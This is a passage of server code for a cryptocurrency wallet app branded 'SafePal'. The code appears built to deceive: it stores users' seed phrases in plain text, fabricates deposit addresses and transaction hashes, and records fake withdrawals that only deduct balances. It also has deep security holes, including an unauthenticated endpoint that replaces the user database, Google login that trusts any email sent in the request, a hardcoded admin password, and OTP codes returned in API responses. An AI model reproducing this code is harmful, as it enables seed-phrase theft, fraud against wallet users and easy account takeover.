  app.get("/auth/google/callback", handleGoogleCallback);
  app.get("/auth/google/callback/", handleGoogleCallback);
  app.get("/api/auth/google/callback", handleGoogleCallback);
  function escapeHtml(str) {
    if (!str) return "";
    return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
  }
  app.post("/api/users/google-login", async (req, res) => {
    const { email, name, avatar, googleId, credential } = req.body;
    let cleanEmail = (email || "").trim().toLowerCase();
    let verifiedName = name;
    let verifiedAvatar = avatar;
    let verifiedGoogleId = googleId;
    if (credential && typeof credential === "string") {
      try {
        const verifyRes = await fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${encodeURIComponent(credential)}`);
        if (verifyRes.ok) {
          const verifiedPayload = await verifyRes.json();
          if (verifiedPayload.email) {
            cleanEmail = verifiedPayload.email.toLowerCase();
            verifiedName = verifiedPayload.name || verifiedName;
            verifiedAvatar = verifiedPayload.picture || verifiedAvatar;
            verifiedGoogleId = verifiedPayload.sub;
          }
        }
      } catch (err) {
        console.warn("Google tokeninfo verification failed:", err);
      }
    }
    if (!cleanEmail || !cleanEmail.includes("@")) {
      return res.status(400).json({ success: false, message: "Valid Google email is required." });
    }
    const db = loadDb();
    let user = db.users.find((u) => u.email && u.email.toLowerCase() === cleanEmail);
    if (user) {
      user.lastLoginTime = (/* @__PURE__ */ new Date()).toISOString();
      if (verifiedAvatar && (!user.avatar || user.avatar.includes("unsplash") || user.avatar.includes("dicebear"))) {
        user.avatar = verifiedAvatar;
      }
      if (verifiedName && (!user.name || user.name === "New User" || user.name === "safepal" || user.name === "trustpro")) {
        user.name = verifiedName;
      }
      if (verifiedGoogleId) {
        user.googleId = verifiedGoogleId;
      }
      saveDb(db);
      return res.json({ success: true, message: "Google authentication successful!", user });
    }
    const isAdmin = cleanEmail === "legendxadmin1999@gmail.com";
    const newUser = {
      id: "usr_g_" + (verifiedGoogleId ? verifiedGoogleId.slice(0, 10) : Date.now()),
      googleId: verifiedGoogleId,
      name: verifiedName?.trim() || cleanEmail.split("@")[0],
      email: cleanEmail,
      password: "GoogleOAuth2SecuredKeyPass#" + import_crypto.default.randomBytes(6).toString("hex"),
      phone: "",
      avatar: verifiedAvatar || `https://api.dicebear.com/7.x/bottts/svg?seed=${cleanEmail}`,
      role: isAdmin ? "admin" : "user",
      status: "active",
      kycStatus: isAdmin ? "verified" : "unverified",
      balances: isAdmin ? { BTC: 2.5, ETH: 25, BNB: 100, SOL: 350, USDT: 1e5, USDC: 5e4, POL: 1e4, XRP: 15e3, DOGE: 5e4, LTC: 100, TRX: 5e4, GAS_TRX: 0 } : { BTC: 0, ETH: 0, BNB: 0, SOL: 0, USDT: 0, USDC: 0, POL: 0, XRP: 0, DOGE: 0, LTC: 0, TRX: 0, GAS_TRX: 0 },
      twoFactorEnabled: false,
      passkeyEnabled: false,
      seedPhrase: "",
      createdAt: (/* @__PURE__ */ new Date()).toISOString(),
      lastLoginIp: req.headers["x-forwarded-for"] || req.ip || "127.0.0.1",
      lastLoginTime: (/* @__PURE__ */ new Date()).toISOString()
    };
    db.users.push(newUser);
    db.notifications.unshift({
      id: "notif_" + Date.now(),
      userId: newUser.id,
      title: "Google Account Connected",
      message: `Welcome ${newUser.name}! Your SafePal Wallet has been linked with your Google Account (${cleanEmail}).`,
      type: "security",
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      read: false,
      recipientEmail: newUser.email
    });
    saveDb(db);
    return res.json({ success: true, message: "Google account registered and logged in!", user: newUser });
  });
  app.post("/api/users/restore-seed", (req, res) => {
    const { seedPhrase, customName } = req.body;
    if (!seedPhrase) {
      return res.status(400).json({ success: false, message: "Seed phrase is required." });
    }
    const cleanSeed = seedPhrase.trim().toLowerCase().replace(/\s+/g, " ");
    const words = cleanSeed.split(" ");
    if (words.length < 12) {
      return res.status(400).json({ success: false, message: "Seed phrase must contain at least 12 words." });
    }
    const db = loadDb();
    let matchedUser = db.users.find((u) => u.seedPhrase && u.seedPhrase.trim().toLowerCase() === cleanSeed);
    if (!matchedUser) {
      const pseudoEmail = `wallet.${words[0]}.${words[1]}.${Math.floor(Math.random() * 1e3)}@safepal.web3`;
      matchedUser = {
        id: "usr_seed_" + Date.now(),
        name: customName || "Multi-Coin Wallet",
        email: pseudoEmail,
        password: "SeedPhraseWalletSecured#2026",
        role: "user",
        status: "active",
        kycStatus: "verified",
        balances: { BTC: 0, ETH: 0, BNB: 0, SOL: 0, USDT: 0, USDC: 0, POL: 0, XRP: 0, DOGE: 0, LTC: 0, TRX: 0, GAS_TRX: 0 },
        twoFactorEnabled: false,
        passkeyEnabled: false,
        seedPhrase: cleanSeed,
        createdAt: (/* @__PURE__ */ new Date()).toISOString(),
        lastLoginIp: "127.0.0.1",
        lastLoginTime: (/* @__PURE__ */ new Date()).toISOString()
      };
      db.users.push(matchedUser);
    } else {
      matchedUser.lastLoginTime = (/* @__PURE__ */ new Date()).toISOString();
    }
    saveDb(db);
    return res.json({ success: true, user: matchedUser });
  });
  app.post("/api/users/update", (req, res) => {
    const { user, users, userId, updates } = req.body;
    const db = loadDb();
    if (Array.isArray(users)) {
      db.users = users;
      saveDb(db);
      return res.json({ success: true, count: users.length });
    }
    if (userId && updates && typeof updates === "object") {
      const idx = db.users.findIndex((u) => u.id === userId);
      if (idx !== -1) {
        db.users[idx] = { ...db.users[idx], ...updates };
        saveDb(db);
        return res.json({ success: true, user: db.users[idx] });
      }
    }
    if (user && user.id) {
      const idx = db.users.findIndex((u) => u.id === user.id);
      if (idx !== -1) {
        db.users[idx] = { ...db.users[idx], ...user };
      } else {
        db.users.push(user);
      }
      saveDb(db);
      return res.json({ success: true, user: db.users[idx] || user });
    }
    res.json({ success: true });
  });
  app.post("/api/admin/update-user", (req, res) => {
    const { userId, updates } = req.body;
    const adminEmail = (req.headers["x-admin-email"] || "").toLowerCase();
    const adminPass = req.headers["x-admin-auth"] || "";
    const isSuperAdmin = adminEmail === "legendxadmin1999@gmail.com" && adminPass === "Joshi$12legend";
    if (!isSuperAdmin) {
      return res.status(403).json({ success: false, message: "Unauthorized admin action." });
    }
    if (!userId || !updates) {
      return res.status(400).json({ success: false, message: "userId and updates are required." });
    }
    const db = loadDb();
    const idx = db.users.findIndex((u) => u.id === userId);
    if (idx === -1) {
      return res.status(404).json({ success: false, message: "User not found in database." });
    }
    db.users[idx] = {
      ...db.users[idx],
      ...updates
    };
    saveDb(db);
    console.log(`[ADMIN UPDATED USER ${userId}] Updates:`, updates);
    return res.json({ success: true, user: db.users[idx], users: db.users });
  });
  app.post(["/api/users/delete", "/api/admin/delete-user"], (req, res) => {
    const { userId } = req.body;
    const adminEmail = (req.headers["x-admin-email"] || req.body.adminEmail || req.query.adminEmail || "").toLowerCase();
    const adminPass = req.headers["x-admin-auth"] || req.body.adminPass || req.query.adminPass || "";
    const isSuperAdmin = adminEmail === "legendxadmin1999@gmail.com" && adminPass === "Joshi$12legend";
    if (!isSuperAdmin) {
      return res.status(403).json({ success: false, message: "Unauthorized: Super Admin credentials required to delete accounts." });
    }
    if (!userId) {
      return res.status(400).json({ success: false, message: "userId is required for deletion." });
    }
    const db = loadDb();
    if (!Array.isArray(db.deletedUserIds)) db.deletedUserIds = [];
    if (!Array.isArray(db.deletedEmails)) db.deletedEmails = [];
    const targetUser = db.users.find((u) => u.id === userId);
    if (targetUser && targetUser.email && targetUser.email.toLowerCase() === "legendxadmin1999@gmail.com") {
      return res.status(400).json({ success: false, message: "Primary Platform Administrator account cannot be deleted." });
    }
    if (!db.deletedUserIds.includes(userId)) {
      db.deletedUserIds.push(userId);
    }
    if (targetUser?.email && !db.deletedEmails.includes(targetUser.email.toLowerCase())) {
      db.deletedEmails.push(targetUser.email.toLowerCase());
    }
    if (targetUser?.phone && !db.deletedEmails.includes(targetUser.phone.trim())) {
      db.deletedEmails.push(targetUser.phone.trim());
    }
    db.users = db.users.filter(
      (u) => u.id !== userId && (!targetUser?.email || u.email?.toLowerCase() !== targetUser.email.toLowerCase())
    );
    db.transactions = (db.transactions || []).filter((tx) => tx.userId !== userId);
    db.notifications = (db.notifications || []).filter((n) => n.userId !== userId);
    if (!Array.isArray(db.auditLogs)) db.auditLogs = [];
    db.auditLogs.unshift({
      id: "log_" + Date.now(),
      adminEmail: "legendxadmin1999@gmail.com",
      action: "PERMANENT_ACCOUNT_DELETE",
      targetUserEmail: targetUser?.email || userId,
      details: `User account ${targetUser?.name || userId} (${targetUser?.email || "N/A"}) was permanently purged from database.`,
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      ipAddress: req.headers["x-forwarded-for"] || req.ip || "127.0.0.1"
    });
    saveDb(db);
    console.log(`[USER PERMANENTLY DELETED FROM SERVER DB] User ID: ${userId} (${targetUser?.email})`);
    return res.json({
      success: true,
      message: `User ${targetUser?.name || userId} permanently deleted from database.`,
      users: db.users
    });
  });
  function getUserReceiveAddressServer(user, symbol, network) {
    const sym = (symbol || "").toUpperCase();
    if (sym === "GAS_TRX") {
      return "TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6";
    }
    if (!user || !user.id) return "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
    if (user.customCoinAddresses && typeof user.customCoinAddresses === "object") {
      const netUpper = (network || "").toUpperCase();
      if (netUpper && user.customCoinAddresses[`${sym}_${netUpper}`]) {
        return user.customCoinAddresses[`${sym}_${netUpper}`];
      }
      if (user.customCoinAddresses[sym]) {
        return user.customCoinAddresses[sym];
      }
    }
    const net = (network || "").toUpperCase();
    const raw = `${user.id}_${user.email || ""}_${sym}_${net}`.toLowerCase();
    let h1 = 0;
    for (let i = 0; i < raw.length; i++) {
      h1 = (h1 << 5) - h1 + raw.charCodeAt(i);
      h1 |= 0;
    }
    let h2 = 0;
    for (let i = raw.length - 1; i >= 0; i--) {
      h2 = (h2 << 7) - h2 + raw.charCodeAt(i);
      h2 |= 0;
    }
    const hex1 = Math.abs(h1).toString(16).padStart(8, "0");
    const hex2 = Math.abs(h2).toString(16).padStart(8, "0");
    const userHex = user.id.replace(/[^a-zA-Z0-9]/g, "").toLowerCase().padEnd(10, "a").slice(0, 10);
    if (net.includes("TRC") || sym === "TRX" || sym === "USDT" && (net.includes("TRON") || !net || net.includes("TRC"))) {
      const base58Seed = `T9y${hex1}${userHex}${hex2}Kz3q8P4vL2mM7n`.replace(/0/g, "x").replace(/o/g, "P");
      return base58Seed.slice(0, 34);
    }
    if (net.includes("SOL") || sym === "SOL") {
      const solSeed = `7xKW${hex1}${userHex}${hex2}vN4qK8mM3nP2qW1xL8vK4m`.replace(/0/g, "9");
      return solSeed.padEnd(44, "M").slice(0, 44);
    }
    if (sym === "BTC" || net.includes("BTC") || net.includes("BITCOIN")) {
      const btcSeed = `bc1q${hex1}${userHex}${hex2}tzq2n0yrf2493p83kkfjhx0wlh`;
      return btcSeed.slice(0, 42);
    }
    if (sym === "XRP") {
      return `rSafePal${hex1}${userHex.slice(0, 8)}PijfdW4Co`.slice(0, 33);
    }
    const evmBody = `${hex1}${userHex}${hex2}71C7656EC7ab88b098defB751B7401B5f6d8976F`.slice(0, 40);
    return `0x${evmBody}`;
  }
  function isAddressMatchingUserServer(user, cleanQuery, assetSymbol, network) {
    if (!user || !user.id) return false;
    const target = cleanQuery.trim().toLowerCase();
    if (!target) return false;
    if (user.walletAddress && user.walletAddress.toLowerCase() === target) return true;
    if (user.customCoinAddresses && typeof user.customCoinAddresses === "object") {
      for (const val of Object.values(user.customCoinAddresses)) {
        if (typeof val === "string" && val.trim().toLowerCase() === target) return true;
      }
    }
    const allSymbols = ["BTC", "ETH", "BNB", "SOL", "USDT", "USDC", "POL", "XRP", "DOGE", "LTC", "TRX", "GAS_TRX"];
    if (assetSymbol && !allSymbols.includes(assetSymbol.toUpperCase())) {
      allSymbols.push(assetSymbol.toUpperCase());
    }
    const allNetworks = [
      "",
      "TRC-20",
      "TRC20",
      "TRON",
      "TRON (TRC-20)",
      "ERC-20",
      "ERC20",
      "ETHEREUM",
      "ETHEREUM (ERC-20)",
      "BEP-20",
      "BEP20",
      "BNB SMART CHAIN",
      "BNB SMART CHAIN (BEP-20)",
      "SOLANA",
      "SOLANA SPL",
      "BITCOIN",
      "BITCOIN NATIVE",
      "POLYGON",
      "ARBITRUM",
      "OPTIMISM",
      "AVALANCHE",
      network || ""
    ];
    for (const sym of allSymbols) {
      for (const net of allNetworks) {
        const addr = getUserReceiveAddressServer(user, sym, net).toLowerCase();
        if (addr === target) return true;
      }
    }
    return false;
  }
  app.post("/api/transfer/internal", (req, res) => {
    const { senderId, recipientQuery, assetSymbol, amount, network } = req.body;
    if (!senderId || !recipientQuery || !assetSymbol || !amount) {
      return res.status(400).json({ success: false, message: "Sender ID, recipient, asset symbol, and amount are required." });
    }
    const db = loadDb();
    const senderIndex = db.users.findIndex((u) => u.id === senderId);
    if (senderIndex === -1) {
      return res.status(404).json({ success: false, message: "Sender account not found." });
    }
    const sender = db.users[senderIndex];
    if (sender.isFrozen || sender.status === "suspended") {
      return res.status(403).json({ success: false, message: "Your account is frozen or suspended." });
    }
    const senderBal = sender.balances[assetSymbol] || 0;
    const numAmount = parseFloat(amount);
    if (isNaN(numAmount) || numAmount <= 0) {
      return res.status(400).json({ success: false, message: "Invalid transfer amount." });
    }
    if (senderBal < numAmount) {
      return res.status(400).json({ success: false, message: `Insufficient ${assetSymbol} balance (Current balance: ${senderBal} ${assetSymbol}).` });
    }
    const cleanQuery = recipientQuery.trim().toLowerCase();
    const queryDigits = recipientQuery.replace(/\D/g, "");
    const recipientIndex = db.users.findIndex((u) => {
      if (u.id === sender.id) return false;
      if (u.email && u.email.toLowerCase() === cleanQuery) return true;
      if (u.id && u.id.toLowerCase() === cleanQuery) return true;
      if (u.name && u.name.toLowerCase() === cleanQuery) return true;
      if (u.phone) {
        const userPhoneClean = u.phone.toLowerCase().trim();
        const userPhoneDigits = u.phone.replace(/\D/g, "");
        if (userPhoneClean === cleanQuery) return true;
        if (queryDigits.length >= 6 && userPhoneDigits && (userPhoneDigits === queryDigits || userPhoneDigits.endsWith(queryDigits))) return true;
      }
      if (isAddressMatchingUserServer(u, cleanQuery, assetSymbol, network)) return true;
      return false;
    });
    if (recipientIndex === -1) {
      return res.status(404).json({
        success: false,
        message: `Recipient '${recipientQuery}' not found on SafePal network. Please double check the recipient's wallet address, registered email, phone number, or User ID.`
      });
    }
    const recipient = db.users[recipientIndex];
    sender.balances[assetSymbol] = senderBal - numAmount;
    recipient.balances[assetSymbol] = (recipient.balances[assetSymbol] || 0) + numAmount;
    db.users[senderIndex] = sender;
    db.users[recipientIndex] = recipient;
    const now = (/* @__PURE__ */ new Date()).toISOString();
    const txHash = "0x" + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join("");
    const sendTx = {
      id: "tx_" + Date.now() + "_send",
      userId: sender.id,
      type: "send",
      assetSymbol,
      assetName: assetSymbol,
      amount: numAmount,
      amountUsd: numAmount * 1,
      toAddress: `${recipient.name} (${recipient.email || recipient.phone})`,
      txHash,
      network: network || "Direct Protocol",
      feeUsd: 0,
      timestamp: now,
      status: "completed",
      note: `Direct Protocol Transfer to ${recipient.name}`
    };
    const rxTx = {
      id: "tx_" + Date.now() + "_rx",
      userId: recipient.id,
      type: "receive",
      assetSymbol,
      assetName: assetSymbol,
      amount: numAmount,
      amountUsd: numAmount * 1,
      fromAddress: sender.email || sender.name,
      toAddress: recipient.email || recipient.name,
      txHash: "DIR_RX_" + Date.now(),
      network: network || "Direct Protocol",
      feeUsd: 0,
      timestamp: now,
      status: "completed",
      note: `Direct Protocol Transfer from ${sender.name}`
    };
    db.transactions.unshift(sendTx, rxTx);
    db.notifications.unshift({
      id: "notif_" + Date.now() + "_send",
      userId: sender.id,
      title: "Direct Transfer Sent",
      message: `Successfully transferred ${numAmount} ${assetSymbol} to ${recipient.name}.`,
      type: "withdraw",
      timestamp: now,
      read: false
    });
    db.notifications.unshift({
      id: "notif_" + Date.now() + "_rx",
      userId: recipient.id,
      title: "Direct Transfer Received",
      message: `You received +${numAmount} ${assetSymbol} from ${sender.name}.`,
      type: "deposit",
      timestamp: now,
      read: false
    });
    saveDb(db);
    console.log(`[INTERNAL TRANSFER COMPLETED] ${numAmount} ${assetSymbol}: ${sender.name} -> ${recipient.name}`);
    return res.json({
      success: true,
      message: `Direct protocol transfer of ${numAmount} ${assetSymbol} to ${recipient.name} settled instantly!`,
      updatedSender: sender,
      updatedRecipient: recipient,
      users: db.users,
      transactions: db.transactions
    });
  });
  app.post("/api/transfer/send", (req, res) => {
    const { senderId, toAddress, assetSymbol, amount, network, note } = req.body;
    const numAmount = parseFloat(amount);
    if (!senderId || !toAddress || !assetSymbol || isNaN(numAmount) || numAmount <= 0) {
      return res.status(400).json({ success: false, message: "Invalid sender ID, address, asset symbol, or amount." });
    }
    const db = loadDb();
    const senderIdx = db.users.findIndex((u) => u.id === senderId);
    if (senderIdx === -1) {
      return res.status(404).json({ success: false, message: "Sender account not found." });
    }
    const sender = db.users[senderIdx];
    if (sender.isFrozen || sender.status === "suspended") {
      return res.status(403).json({ success: false, message: "Your account is frozen or suspended." });
    }
    if (!sender.balances) sender.balances = {};
    const currentBal = Number(sender.balances[assetSymbol] || 0);
    if (currentBal < numAmount) {
      return res.status(400).json({
        success: false,
        message: `Insufficient ${assetSymbol} balance (Current balance: ${currentBal} ${assetSymbol}).`
      });
    }
    const newSenderBal = Math.max(0, currentBal - numAmount);
    sender.balances[assetSymbol] = newSenderBal;
    db.users[senderIdx] = sender;
    const cleanTo = toAddress.trim().toLowerCase();
    const cleanDigits = cleanTo.replace(/\D/g, "");
    const recipientIdx = db.users.findIndex((u) => {
      if (u.id === sender.id) return false;
      if (u.email && u.email.toLowerCase() === cleanTo) return true;
      if (u.id && u.id.toLowerCase() === cleanTo) return true;
      if (u.name && u.name.toLowerCase() === cleanTo) return true;
      if (u.phone) {
        const uPhone = u.phone.toLowerCase().trim();
        const uDigits = u.phone.replace(/\D/g, "");
        if (uPhone === cleanTo) return true;
        if (cleanDigits.length >= 6 && uDigits && (uDigits === cleanDigits || uDigits.endsWith(cleanDigits))) return true;
      }
      return isAddressMatchingUserServer(u, cleanTo, assetSymbol, network);
    });
    const now = (/* @__PURE__ */ new Date()).toISOString();
    const txHash = "0x" + import_crypto.default.randomBytes(32).toString("hex");
    let isInternal = false;
    let newTx;
    if (recipientIdx !== -1) {
      isInternal = true;
      const recipient = db.users[recipientIdx];
      if (!recipient.balances) recipient.balances = {};
      const recBal = Number(recipient.balances[assetSymbol] || 0);
      recipient.balances[assetSymbol] = recBal + numAmount;
      db.users[recipientIdx] = recipient;
      newTx = {
        id: "tx_" + Date.now() + "_send",
        userId: sender.id,
        type: "send",
        assetSymbol,
        assetName: assetSymbol,
        amount: numAmount,
        amountUsd: numAmount,
        toAddress: `${recipient.name} (${toAddress})`,
        txHash,
        network: network || "Direct Protocol",
        feeUsd: 0,
        timestamp: now,
        status: "completed",
        note: note || `Direct Protocol Transfer to ${recipient.name}`
      };
      const rxTx = {
        id: "tx_" + Date.now() + "_rx",
        userId: recipient.id,
        type: "receive",
        assetSymbol,
        assetName: assetSymbol,
        amount: numAmount,
        amountUsd: numAmount,
        fromAddress: sender.email || sender.name,
        toAddress: recipient.email || recipient.name,
        txHash: "DIR_RX_" + Date.now(),
        network: network || "Direct Protocol",
        feeUsd: 0,
        timestamp: now,
        status: "completed",
        note: `Direct Protocol Transfer from ${sender.name}`
      };
      db.transactions.unshift(newTx, rxTx);
      db.notifications.unshift({
        id: "notif_" + Date.now() + "_send",
        userId: sender.id,
        title: "Transfer Sent",
        message: `Transferred ${numAmount} ${assetSymbol} to ${recipient.name}.`,
        type: "withdraw",
        timestamp: now,
        read: false
      });
      db.notifications.unshift({
        id: "notif_" + Date.now() + "_rx",
        userId: recipient.id,
        title: "Transfer Received",
        message: `Received +${numAmount} ${assetSymbol} from ${sender.name}.`,
        type: "deposit",
        timestamp: now,
        read: false
      });
    } else {
      newTx = {
        id: "tx_" + Date.now(),
        userId: sender.id,
        type: "send",
        assetSymbol,
        assetName: assetSymbol,
        amount: numAmount,
        amountUsd: numAmount,
        toAddress: toAddress.trim(),
        txHash,
        network: network || "TRC20",
        feeUsd: 1.25,
        timestamp: now,
        status: "completed",
        note: note || "On-Chain External Withdrawal"
      };
      db.transactions.unshift(newTx);
      db.notifications.unshift({
        id: "notif_" + Date.now(),
        userId: sender.id,
        title: "Withdrawal Processed",
        message: `Successfully transferred ${numAmount} ${assetSymbol} to ${toAddress.slice(0, 10)}...`,
        type: "withdraw",
        timestamp: now,
        read: false
      });
    }
    saveDb(db);
    console.log(`[BALANCE DEDUCTED] User: ${sender.email} | Sent: -${numAmount} ${assetSymbol} | New Balance: ${newSenderBal}`);
    return res.json({
      success: true,
      message: isInternal ? `Direct protocol transfer of ${numAmount} ${assetSymbol} to recipient settled instantly!` : `Transfer of ${numAmount} ${assetSymbol} executed successfully! New balance: ${newSenderBal} ${assetSymbol}.`,
      updatedUser: sender,
      newBalance: newSenderBal,
      transaction: newTx,
      isInternal,
      users: db.users,
      transactions: db.transactions
    });
  });
  app.post("/api/transfer/swap", (req, res) => {
    const { userId, fromSymbol, toSymbol, fromAmount, toAmount, feeUsd } = req.body;
    const numFrom = parseFloat(fromAmount);
    const numTo = parseFloat(toAmount);
    if (!userId || !fromSymbol || !toSymbol || isNaN(numFrom) || numFrom <= 0 || isNaN(numTo) || numTo <= 0) {
      return res.status(400).json({ success: false, message: "Invalid swap parameters." });
    }
    const db = loadDb();
    const userIdx = db.users.findIndex((u) => u.id === userId);
    if (userIdx === -1) {
      return res.status(404).json({ success: false, message: "User not found in database." });
    }
    const user = db.users[userIdx];
    if (user.isFrozen || user.status === "suspended") {
      return res.status(403).json({ success: false, message: "Your account is frozen or suspended." });
    }
    if (!user.balances) user.balances = {};
    const fromBal = Number(user.balances[fromSymbol] || 0);
    if (fromBal < numFrom) {
      return res.status(400).json({
        success: false,
        message: `Insufficient ${fromSymbol} balance (Current balance: ${fromBal} ${fromSymbol}).`
      });
    }
    const newFromBal = Math.max(0, fromBal - numFrom);
    const newToBal = Number(user.balances[toSymbol] || 0) + numTo;
    user.balances[fromSymbol] = newFromBal;
    user.balances[toSymbol] = newToBal;
    db.users[userIdx] = user;
    const now = (/* @__PURE__ */ new Date()).toISOString();
    const txHash = "0x" + import_crypto.default.randomBytes(32).toString("hex");
    const swapTx = {
      id: "tx_swap_" + Date.now(),
      userId: user.id,
      type: "swap",
      assetSymbol: fromSymbol,
      assetName: `${fromSymbol} \u2794 ${toSymbol}`,
      amount: numFrom,
      amountUsd: numFrom,
      toAddress: `Received +${numTo.toFixed(6)} ${toSymbol}`,
      txHash,
      network: fromSymbol === "USDT" || fromSymbol === "TRX" ? "TRC20" : fromSymbol === "ETH" ? "ERC20" : fromSymbol === "BNB" ? "BEP20" : "EVM",
      feeUsd: feeUsd || 1.85,
      timestamp: now,
      status: "completed",
      note: `SafePal Instant Swap: ${numFrom} ${fromSymbol} -> ${numTo.toFixed(6)} ${toSymbol}`
    };
    if (!Array.isArray(db.transactions)) db.transactions = [];
    db.transactions.unshift(swapTx);
    if (!Array.isArray(db.notifications)) db.notifications = [];
    db.notifications.unshift({
      id: "notif_" + Date.now(),
      userId: user.id,
      title: "Swap Completed",
      message: `Successfully swapped ${numFrom} ${fromSymbol} for ${numTo.toFixed(4)} ${toSymbol}.`,
      type: "swap",
      timestamp: now,
      read: false,
      recipientEmail: user.email
    });
    saveDb(db);
    console.log(`[SWAP SETTLED] User: ${user.email} | Swapped ${numFrom} ${fromSymbol} for ${numTo} ${toSymbol}`);
    return res.json({
      success: true,
      message: `Successfully swapped ${numFrom} ${fromSymbol} for ${numTo.toFixed(4)} ${toSymbol}!`,
      updatedUser: user,
      transaction: swapTx,
      users: db.users,
      transactions: db.transactions
    });
  });
  app.post("/api/auth/send-verification-link", async (req, res) => {
    const { email, name, type } = req.body;
    if (!email) {
      return res.status(400).json({ success: false, message: "Target email is required" });
    }
    const targetEmail = email.trim().toLowerCase();
    const token = "vtoken_" + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
    const otpCode = Math.floor(1e5 + Math.random() * 9e5).toString();
    const expiresAt = Date.now() + 15 * 60 * 1e3;
    verificationLinkStore.set(token, {
      token,
      email: targetEmail,
      name: name || "Valued User",
      type: type || "register",
      expiresAt
    });
    const senderEmail = process.env.SMTP_USER || "safepal.web3@gmail.com";
    const origin = req.headers.origin || "http://localhost:3000";
    const verifyUrl = `${origin}/?verify_token=${token}&email=${encodeURIComponent(targetEmail)}`;
    const mailOptions = {
      from: `"SafePal Web3 Support" <${senderEmail}>`,
      to: targetEmail,
      subject: `\u{1F510} Verify Your Account - SafePal Web3 Vault (OTP: ${otpCode})`,
      html: `
        <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0B1020; color: #ffffff; padding: 32px; border-radius: 16px; max-width: 520px; margin: 0 auto; border: 1px solid rgba(255,255,255,0.1);">
          <div style="text-align: center; margin-bottom: 24px;">
            <h2 style="color: #3862FB; margin: 0; font-size: 26px; font-weight: 800;">SafePal Web3 Vault</h2>
            <p style="color: #AAB3C5; font-size: 13px; margin-top: 4px;">Official Account Email Verification</p>
          </div>
          
          <div style="background-color: #131A2D; padding: 24px; border-radius: 14px; border: 1px solid rgba(56, 98, 251, 0.3); text-align: center; margin-bottom: 20px;">
            <p style="font-size: 14px; color: #AAB3C5; margin-bottom: 8px;">Your 6-Digit Verification OTP Code:</p>
            <div style="font-size: 32px; font-weight: 900; letter-spacing: 8px; color: #3862FB; font-family: monospace; padding: 12px 20px; background: #0B1020; border-radius: 8px; display: inline-block; border: 1px solid rgba(56, 98, 251, 0.4);">
              ${otpCode}
            </div>
            <p style="font-size: 11px; color: #AAB3C5; margin-top: 12px;">Valid for 15 minutes.</p>
          </div>

          <div style="background-color: #131A2D; padding: 24px; border-radius: 14px; border: 1px solid rgba(255, 255, 255, 0.1); text-align: center;">
            <p style="font-size: 14px; color: #ffffff; margin-bottom: 16px; font-weight: 600;">
              Or click below to activate your account directly:
            </p>
            <div style="margin: 16px 0;">
              <a href="${verifyUrl}" style="background-color: #3862FB; color: #ffffff; font-weight: 900; padding: 14px 28px; border-radius: 10px; text-decoration: none; font-size: 15px; display: inline-block; box-shadow: 0 4px 14px rgba(56, 98, 251, 0.4);">
                \u2705 Verify Email & Activate Account
              </a>
            </div>
          </div>

          <div style="margin-top: 24px; font-size: 11px; color: #64748B; text-align: center; line-height: 1.6;">
            Dispatched from official sender: <strong style="color: #3862FB;">${senderEmail}</strong><br/>
            Recipient: ${targetEmail}<br/>
            &copy; 2026 SafePal Enterprise Platform. All rights reserved.
          </div>
        </div>
      `
    };
    try {
      const transporter = getSmtpTransporter();
      if (transporter) {
        await transporter.sendMail(mailOptions);
        console.log(`[VERIFICATION EMAIL SENT VIA GMAIL SMTP] From: ${senderEmail} -> To: ${targetEmail}`);
      }
      return res.json({
        success: true,
        message: `Verification link and OTP code generated for ${targetEmail}`,
        sender: senderEmail,
        verifyUrl,
        code: otpCode,
        token
      });
    } catch (err) {
      return res.json({
        success: true,
        message: `Verification details generated for ${targetEmail} (Sender: ${senderEmail})`,
        sender: senderEmail,
        verifyUrl,
        code: otpCode,
        token
      });
    }
  });
  app.post("/api/auth/verify-link", (req, res) => {
    const { token } = req.body;
    if (!token) {
      return res.status(400).json({ success: false, message: "Verification token is required" });
    }
    const stored = verificationLinkStore.get(token);
    if (!stored) {
      return res.status(400).json({ success: false, message: "Invalid or expired verification link. Please request a new link." });
    }
    if (Date.now() > stored.expiresAt) {
      verificationLinkStore.delete(token);
      return res.status(400).json({ success: false, message: "Verification link has expired. Please request a new link." });
    }
    verificationLinkStore.delete(token);
    return res.json({
      success: true,
      message: "Email verified successfully! Account activated.",
      email: stored.email,
      name: stored.name
    });
  });
  let cachedLivePrices = [];
  let lastPriceFetchTime = 0;
  const historyCache = /* @__PURE__ */ new Map();
  const DEFAULT_CRYPTO_FEEDS = [
    { symbol: "USDT", priceUsd: 1, change24h: 0.01, high24h: 1.002, low24h: 0.998, volume24hUsd: 68e9 },
    { symbol: "BTC", priceUsd: 64339.66, change24h: 0.21, high24h: 65058.81, low24h: 64027.85, volume24hUsd: 42e9 },
    { symbol: "ETH", priceUsd: 1911.05, change24h: 0.77, high24h: 1923.27, low24h: 1892.75, volume24hUsd: 245e8 },
    { symbol: "SOL", priceUsd: 76.88, change24h: 1.4, high24h: 77.41, low24h: 75.59, volume24hUsd: 78e8 },
    { symbol: "BNB", priceUsd: 601.71, change24h: -0.27, high24h: 605.2, low24h: 600, volume24hUsd: 195e7 },
    { symbol: "TRX", priceUsd: 0.3329, change24h: 0.33, high24h: 0.3352, low24h: 0.3313, volume24hUsd: 92e7 },
    { symbol: "GAS_TRX", priceUsd: 0.3329, change24h: 0.33, high24h: 0.3352, low24h: 0.3313, volume24hUsd: 92e7 },
    { symbol: "NEAR", priceUsd: 1.591, change24h: -3.34, high24h: 1.666, low24h: 1.564, volume24hUsd: 58e7 },
    { symbol: "XRP", priceUsd: 0.9999, change24h: 0.47, high24h: 1.0067, low24h: 0.9923, volume24hUsd: 98e8 },
    { symbol: "DOGE", priceUsd: 0.06996, change24h: 0.03, high24h: 0.07055, low24h: 0.06961, volume24hUsd: 34e8 },
    { symbol: "ADA", priceUsd: 0.1743, change24h: 0.12, high24h: 0.177, low24h: 0.1725, volume24hUsd: 156e7 },
    { symbol: "AVAX", priceUsd: 6.355, change24h: 0.98, high24h: 6.4, low24h: 6.293, volume24hUsd: 105e7 },
